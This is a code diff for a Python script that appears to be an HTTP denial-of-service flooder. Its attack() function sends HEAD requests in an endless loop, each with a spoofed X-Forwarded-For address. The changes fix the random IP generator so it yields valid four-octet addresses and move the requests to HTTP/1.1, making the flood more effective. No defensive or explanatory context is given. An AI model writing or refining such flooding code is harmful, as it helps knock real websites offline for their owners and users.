@@ -47,7 +47,7 @@ else:
 
 
 def randomip():
-  randip = ".".join(str(random.randint(0, 255)) for _ in range(10))
+  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
   return randip
 
 
@@ -55,7 +55,7 @@ def attack():
   connection = "Connection: null\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
-  get_host = "HEAD "  + url + " HTTP/1.0\r\nHost: " + ip + "\r\n"
+  get_host = "HEAD "  + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
   request = get_host + referer  + connection + forward + "\r\n\r\n"
   while True:
     try:
